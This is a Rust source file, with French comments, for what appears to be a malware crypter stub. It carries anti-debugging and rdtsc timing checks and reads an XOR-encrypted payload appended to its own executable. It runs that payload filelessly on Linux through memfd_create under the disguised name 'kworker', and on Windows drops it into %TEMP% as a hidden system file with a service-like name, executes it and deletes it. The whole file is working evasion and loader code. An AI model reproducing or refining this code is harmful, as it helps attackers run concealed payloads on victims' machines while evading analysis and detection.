#![windows_subsystem = "windows"] //a decom pourg debug
#![allow(unsafe_op_in_unsafe_fn)]
#![allow(unused_imports)]

use std::env;
use std::fs::File;
use std::io::{Read, Write};
use std::process::{Command, exit};
use obfstr::obfstr;

// MAGIC DELIMITER
const MAGIC_DELIMITER: &[u8] = &[
    0xDE, 0xAD, 0xBE, 0xEF, 0xC0, 0xFF, 0xEE, 0x11
];

const PARTIAL_KEY: u8 = 0x55;
const MAX_CYCLES: u64 = 50_000_000;

fn main() {
    if is_being_debugged() { exit(0); }
    let start_time = unsafe { std::arch::x86_64::_rdtsc() };
    let current_exe = env::current_exe().unwrap_or_else(|_| exit(0));
    let mut file = File::open(current_exe).unwrap_or_else(|_| exit(0));
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer).unwrap_or_else(|_| exit(0));
    let delimiter_pos = buffer
        .windows(MAGIC_DELIMITER.len())
        .rposition(|window| window == MAGIC_DELIMITER);
    let end_time = unsafe { std::arch::x86_64::_rdtsc() };
    let delta = end_time - start_time;
    if delta > MAX_CYCLES {
        unsafe { CORRUPTED_MODE = true; }
    }
    if let Some(pos) = delimiter_pos {
        let encrypted_data = &buffer[pos + MAGIC_DELIMITER.len()..];
        
        let final_key = if unsafe { CORRUPTED_MODE } { 
            PARTIAL_KEY ^ 0xFF 
        } else { 
            PARTIAL_KEY 
        };
        let decrypted: Vec<u8> = encrypted_data.iter().map(|&b| b ^ final_key).collect();
        #[cfg(target_os = "linux")]
        linux_mem_exec(decrypted);

        #[cfg(target_os = "windows")]
        unsafe { windows_stealth_exec(decrypted); }
    }
}

static mut CORRUPTED_MODE: bool = false;

fn is_being_debugged() -> bool {
    #[cfg(target_os = "linux")]
    unsafe { if libc::ptrace(libc::PTRACE_TRACEME, 0, 0, 0) < 0 { return true; } }
    #[cfg(target_os = "windows")]
    unsafe { if winapi::um::debugapi::IsDebuggerPresent() != 0 { return true; } }
    false
}

#[cfg(target_os = "linux")]
fn linux_mem_exec(payload: Vec<u8>) {
    use std::os::unix::io::FromRawFd;
    use std::ffi::CString;
    unsafe {
        let name = CString::new("kworker").unwrap();
        let fd = libc::memfd_create(name.as_ptr(), libc::MFD_CLOEXEC);
        if fd < 0 { return; }
        let mut file = File::from_raw_fd(fd);
        file.write_all(&payload).unwrap();
        let path = format!("/proc/self/fd/{}", fd);
        let args: Vec<String> = env::args().skip(1).collect();
        Command::new(path).args(&args).status().ok();
    }
}

#[cfg(target_os = "windows")]
unsafe fn windows_stealth_exec(payload: Vec<u8>) {
    // IMPORTS CRITIQUES CORRIGÉS
    use std::os::windows::ffi::OsStrExt;     // Pour encode_wide
    use std::os::windows::ffi::OsStringExt;  // Pour from_wide 
    use std::ffi::OsStr;
    use std::iter::once;
    use winapi::um::fileapi::{SetFileAttributesW, GetTempPathW};
    use winapi::um::winnt::{FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM, FILE_ATTRIBUTE_TEMPORARY};
    // 1. Setup chemin (%TEMP%)
    let mut temp_path_buffer = [0u16; 261];
    let len = GetTempPathW(261, temp_path_buffer.as_mut_ptr());
    // Utilisation de from_wide (nécessite OsStringExt)
    let temp_dir = std::ffi::OsString::from_wide(&temp_path_buffer[..len as usize]);
    let file_name = obfstr!("win_service_cache.tmp").to_owned(); 
    let target_path = std::path::Path::new(&temp_dir).join(&file_name);
    // 2. Écriture
    {
        if let Ok(mut file) = File::create(&target_path) {
            file.write_all(&payload).unwrap();
        } else { return; }
    }
    // 3. Attributs furtifs
    let path_str: Vec<u16> = target_path.as_os_str().encode_wide().chain(once(0)).collect();
    SetFileAttributesW(
        path_str.as_ptr(), 
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY
    );
    // 4. Exécution
    let _ = Command::new(&target_path).status();
    // 5. Nettoyage
    let _ = std::fs::remove_file(&target_path);
}